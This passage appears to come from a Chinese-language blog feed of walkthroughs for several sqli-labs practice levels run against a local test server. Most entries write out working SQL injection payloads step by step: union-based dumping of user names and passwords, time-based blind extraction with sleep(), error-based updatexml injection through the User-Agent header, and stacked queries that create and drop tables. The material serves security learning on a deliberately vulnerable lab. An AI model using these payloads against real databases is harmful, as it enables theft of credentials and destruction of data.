<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431340990.png" alt="1584431340990"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上面报错，双引号后面还有一个括号，加上括号试试</span><br><span class="line">1&quot;)#</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431488882.png" alt="1584431488882"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前当前字段数</span><br><span class="line">1&quot;) order by 2#</span><br><span class="line">之前测过3会报错，不再演示，输入2时返回正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431221757.png" alt="1584431221757"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道当前字段数之后查看注入点</span><br><span class="line">1&quot;) union select 1,2#</span><br><span class="line">注入点1,和2</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431591780.png" alt="1584431591780"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在2的位置查看当前数据库</span><br><span class="line">1&quot;) union select 1,database()#</span><br><span class="line">当前数据库是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431633461.png" alt="1584431633461"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道当前数据库了来查询表名</span><br><span class="line">1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;#</span><br><span class="line">获取到当前的表</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431715052.png" alt="1584431715052"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看users表中字段</span><br><span class="line">1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">获取到一下字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431775656.png" alt="1584431775656"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看一下username和password</span><br><span class="line">1&quot;) union select 1,group_concat(username,password) from users#</span><br><span class="line">成功地获取到了用户和密码</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3POST%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584431843577.png" alt="1584431843577"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十关GET时间</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当看到you are in 就知道这是盲注，尝试使用符号，测试是否有sql注入漏洞。当经过测试之后发现和第九题一样，全部都返回you are in，尝试一下使用延迟注入，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584412317773.png" alt="1584412317773"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当我们使用单引号的时候，执行了两秒结束，说明单引号返回正确，在尝试一下双引号</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584412818317.png" alt="1584412818317"></p>
<p>发现双引号运行时间为12秒，说明双引号存在sql注入漏洞，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584412897579.png" alt="1584412897579"></p>
<p>我要知道双引号是sql注入漏洞后，要判断当前数据库名称，并获取。</p>
<p>查看数据库名称的第一个字母，返回时间两秒说明正确</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">为什么返回两秒正确，而不是10秒，因为在115后面跟了个1如果当ascii码等于115时执行1，不等于时执行sleep(10),所以这里执行两秒返回正确</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584413519745.png" alt="1584413519745"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里在尝试一下输入其他ascii编码看看是否跟上面我们所说的，错误时执行sleep，将ascii改成116时错误，执行sleep，按照这种方法更前,1,1的第一个数字以此类推得出当前数据库名为security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584414372860.png" alt="1584414372860"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取表名，查看当前库下的第一个表名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,1,sleep(10))--+</span><br><span class="line">数据库中第一个表的第一个字母是的ascii码是101，对应的是e，测试之后的出表名为emails，如果ascii不是101的话执行sleep</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584415089035.png" alt="1584415089035"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当判断错误时，执行sleep，将ascii码改成了102之后错误，执行sleep，以此类推，需要测试其他表时只需要更改limit就可以</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584415232307.png" alt="1584415232307"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">就以emails为例，查询表中的字段</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(10))--+</span><br><span class="line">当ascii等于105的时候，返回两秒正确，测试等于其他编码时是否也会显示正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584415516771.png" alt="1584415516771"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当这里ascii吗等于106的时候返回错误，执行sleep，说明语句正确，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584415687248.png" alt="1584415687248"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入mysql库查看当前emails下有什么字段，查看上面操作是否正确，可以看到105对应的正是i，所以说明语句正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584415768892.png" alt="1584415768892"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">再来查询一下id表中得数据，当ascii等于49的时候返回时间2秒，说明正确，ascii中的49对应的是1，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584416532066.png" alt="1584416532066"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们修改一下ascii码看看我们的语句是否正确，将ascii码修改成50时错误，执行sleep，执行时间12秒，数据以此类推。</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584416683096.png" alt="1584416683096"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看一下当前emails中的id字段里的第一个数据是否是1，发现确实是1说明语句正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584416771233.png" alt="1584416771233"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十八关POST报错User-Agent位置</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3POST%E6%8A%A5%E9%94%99User-Agent%E4%BD%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3POST%E6%8A%A5%E9%94%99User-Agent%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584539579709.png" alt="1584539579709"></p>
<p>这里是在User-Agent后注入，</p>
<p>查询库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">结尾的引号是将其带入到ip和username中去进行闭合，闭合完成注释掉后面的语句</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(database())),1),&#39;&#39;,&#39;&#39;)#</span><br><span class="line">获得库名security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3POST%E6%8A%A5%E9%94%99User-Agent%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584539678871.png" alt="1584539678871"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询当前数据库中的字段</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1)),1),&#39;&#39;,&#39;&#39;)#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3POST%E6%8A%A5%E9%94%99User-Agent%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584539935246.png" alt="1584539935246"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询emails下的字段</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 0,1)),1),&#39;&#39;,&#39;&#39;)#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3POST%E6%8A%A5%E9%94%99User-Agent%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584540048914.png" alt="1584540048914"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看id的第一行数据</span><br><span class="line">1&#39; or updatexml(1,concat(0x7e,(select id from emails limit 0,1)),1),&#39;&#39;,&#39;&#39;)#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3POST%E6%8A%A5%E9%94%99User-Agent%E4%BD%8D%E7%BD%AE/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584540088710.png" alt="1584540088710"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十四关POST报错</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试报错信息</span><br><span class="line">1&quot;</span><br><span class="line">使用双引号报错，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435155581.png" alt="1584435155581"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加上注释符看一下是否回显正确</span><br><span class="line">1&quot;#</span><br><span class="line">没有回显说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435205316.png" alt="1584435205316"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看字段数</span><br><span class="line">1&quot; order by 2 #</span><br><span class="line">之前试过3字段错误，2字段没有回显正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435309598.png" alt="1584435309598"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看注入点</span><br><span class="line">1&quot; union select 1,2 #</span><br><span class="line">没有回显，但是之前出现过错误信息，我们这里使用报错注入试一下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435358630.png" alt="1584435358630"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">报错注入查看当前数据库名称</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(database()),0x7e),1) #</span><br><span class="line">成功返回当前数据库security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435491719.png" alt="1584435491719"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">继续使用报错注入查看数据库下的表名</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) #</span><br><span class="line">成功返回emails如果要查看其他表更改limit就可以</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435584477.png" alt="1584435584477"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为之前查的我们已知有一个users表，查看一下</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1) #</span><br><span class="line">第一个字段是id</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435675027.png" alt="1584435675027"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们已知有username，password表，查看一下password</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) #</span><br><span class="line">页面成功返回</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435748617.png" alt="1584435748617"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十一关堆叠</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/</url>
    <content><![CDATA[<h5 id="查看最初页面，页面返回正常"><a href="#查看最初页面，页面返回正常" class="headerlink" title="查看最初页面，页面返回正常"></a>查看最初页面，页面返回正常</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585054348755.png" alt="1585054348755"></p>
<h5 id="查看源码，-id并没有被单引号包裹，这里和39关的区别就是39关加上单引号会显示报错信息，而当前加上单引号不会显示报错信息"><a href="#查看源码，-id并没有被单引号包裹，这里和39关的区别就是39关加上单引号会显示报错信息，而当前加上单引号不会显示报错信息" class="headerlink" title="查看源码，$id并没有被单引号包裹，这里和39关的区别就是39关加上单引号会显示报错信息，而当前加上单引号不会显示报错信息"></a>查看源码，$id并没有被单引号包裹，这里和39关的区别就是39关加上单引号会显示报错信息，而当前加上单引号不会显示报错信息</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585054421472.png" alt="1585054421472"></p>
<h5 id="向数据库插入表，页面返回正常"><a href="#向数据库插入表，页面返回正常" class="headerlink" title="向数据库插入表，页面返回正常"></a>向数据库插入表，页面返回正常</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585054601569.png" alt="1585054601569"></p>
<h5 id="查看数据库，crow成功创建了"><a href="#查看数据库，crow成功创建了" class="headerlink" title="查看数据库，crow成功创建了"></a>查看数据库，crow成功创建了</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585054757572.png" alt="1585054757572"></p>
<h5 id="删除表，页面返回正常"><a href="#删除表，页面返回正常" class="headerlink" title="删除表，页面返回正常"></a>删除表，页面返回正常</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585054814385.png" alt="1585054814385"></p>
<h5 id="查看数据库，成功被删除"><a href="#查看数据库，成功被删除" class="headerlink" title="查看数据库，成功被删除"></a>查看数据库，成功被删除</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585054974841.png" alt="1585054974841"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第四十三关POST堆叠password处</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/</url>
    <content><![CDATA[<p>查看页面原始界面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585096598862.png" alt="1585096598862"></p>
<p>查看一下源代码，和42关一样，过滤了username没有过滤password，包裹了username</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585096647748.png" alt="1585096647748"></p>
<p>以上都是在代码登录是注入的，尝试一下向数据库插入表，密码看不见输入的什么，更改一下源码就可以</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585096795640.png" alt="1585096795640"></p>
<p>将红线处改为text</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585096836993.png" alt="1585096836993"></p>
<p>更改之后密码显示了，点击login登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;) ;  create table crow like users;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585096894882.png" alt="1585096894882"></p>
<p>页面返回错误，虽然返回错误，但是查看一下数据库是否多了crow表</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585096920915.png" alt="1585096920915"></p>
<p>数据库中成功插入crow表</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585097084688.png" alt="1585097084688"></p>
<p>删除表，使用相同方法,点击login</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#39;) ;  drop table crow;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585097307271.png" alt="1585097307271"></p>
<p>页面返回错误</p>
